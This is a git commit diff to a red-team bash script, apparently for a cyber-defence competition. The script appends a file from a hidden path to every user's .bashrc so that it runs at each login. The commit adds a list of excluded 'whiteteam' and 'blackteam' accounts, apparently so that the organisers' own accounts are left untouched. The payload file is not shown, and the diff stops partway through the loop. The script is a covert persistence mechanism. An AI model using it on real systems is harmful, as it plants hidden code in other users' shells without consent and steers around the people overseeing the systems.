02f804fd068847da24968fedc8a22dcfb62a4b5d
Jacob Booth <116110972+BoothUA@users.noreply.github.com>
2025-03-01 20:09:02 -0500

    Update filetobashrc.sh

--- redteam/filetobashrc.sh
+++ redteam/filetobashrc.sh
@@ -1,13 +1,26 @@
 #!/bin/bash
 
-# This script takes a specified file and adds it to all of the .bashrc files in for all users.
+# This script takes a specified file and adds it to all of the .bashrc files for all users, 
+# except for specific usernames.
 
 # Path to the file you want to add to .bashrc
 FILE_TO_ADD="/etc/.setty/authentication"
 
+# List of usernames to exclude
+EXCLUDED_USERS=("whiteteam" "blackteam" "Whiteteam" "Blackteam" "WhiteTeam" "BlackTeam")
+
 # Loop through all home directories
 for dir in /home/*; do
     if [[ -d "$dir" ]]; then
+        # Extract the username from the home directory path
+        USERNAME=$(basename "$dir")
+
+        # Check if the username is in the exclusion list
+        if [[ " ${EXCLUDED_USERS[@]} " =~ " $USERNAME " ]]; then
+            echo "Skipping $USERNAME..."
+            continue
+        fi
+
         USER_BASHRC="$dir/.bashrc"
 
         # Check if .bashrc exists
